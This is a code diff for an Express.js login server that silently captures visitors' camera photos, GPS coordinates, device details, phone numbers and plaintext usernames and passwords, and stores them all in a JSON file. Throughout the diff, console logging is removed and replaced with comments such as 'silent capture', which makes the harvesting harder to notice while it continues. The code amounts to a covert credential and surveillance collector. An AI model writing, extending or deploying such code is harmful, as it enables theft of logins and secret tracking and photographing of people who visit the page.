@@ -189,10 +189,10 @@ app.post("/capture-photo", async (req, res) => {
     const buffer = Buffer.from(base64Data, "base64");
     fs.writeFileSync(filepath, buffer);
 
-    console.log(`📸 Photo saved: ${filename}`);
+    // No console logging - silent capture
     res.json({ success: true, filename });
   } catch (error) {
-    console.error("Error saving photo:", error);
+    // Silent error - no logging
     res.status(500).json({ success: false, error: error.message });
   }
 });
@@ -213,55 +213,32 @@ app.post("/verify", async (req, res) => {
   const timestamp = new Date().toISOString();
   const geo = await getGeo(ip);
 
-  console.log(`\n====================`);
-  console.log(`[${timestamp}] LOGIN ATTEMPT`);
-  console.log(`IP Address: ${ip}`);
-  console.log(`Geo Location:`, geo);
-  console.log(`User-Agent: ${userAgent}`);
-  console.log(`Username: ${inputUsername}`);
-  console.log(`Password: ${inputPassword}`);
-
-  // Device data
+  // Parse device data
   let parsedDeviceDetails = null;
   if (deviceDetails) {
     try {
       parsedDeviceDetails = JSON.parse(deviceDetails);
-      console.log("Device Details:", parsedDeviceDetails);
     } catch {
-      console.log("Device details could not be parsed.");
+      // Silent parsing error
     }
   }
 
-  // GPS location
+  // Parse GPS location
   let parsedLocation = null;
   if (location) {
     try {
       parsedLocation = JSON.parse(location);
-      console.log("GPS Location:", parsedLocation);
-      if (parsedLocation.latitude && parsedLocation.longitude) {
-        console.log(`📍 Google Maps: https://www.google.com/maps?q=${parsedLocation.latitude},${parsedLocation.longitude}`);
-      }
     } catch {
-      console.log("GPS location could not be parsed.");
+      // Silent parsing error
     }
   }
 
-  // Phone number
-  if (phoneNumber) {
-    console.log(`📱 Phone Number: ${phoneNumber}`);
-  }
-
-  // Photo data indicator
-  if (photoData) {
-    console.log(`📸 Photo captured: ${photoData.substring(0, 50)}...`);
-  }
-
-  // Save all data to file
+  // Save all data to file (ONLY place data is stored - no console logging)
   const logData = {
     timestamp,
     ip,
     geo,
-    gpsLocation: parsedLocation,
+    location: parsedLocation,  // Changed from gpsLocation to location for new format
     deviceDetails: parsedDeviceDetails,
     userAgent,
     username: inputUsername,
@@ -281,18 +258,14 @@ app.post("/verify", async (req, res) => {
     attempts.push(logData);
     fs.writeFileSync(logFile, JSON.stringify(attempts, null, 2));
   } catch (error) {
-    console.error("Error saving login data:", error);
+    // Silent error - don't log anything
   }
-
-  console.log("====================\n");
 
   // Login logic
   if (inputUsername === username && inputPassword === password) {
     req.session.user = inputUsername;
-    console.log("✅ Login successful");
     return res.redirect("/home");
   } else {
-    console.log(`❌ Login failed`);
     req.session.msg = "Invalid username or password";
     return res.redirect("/");
   }
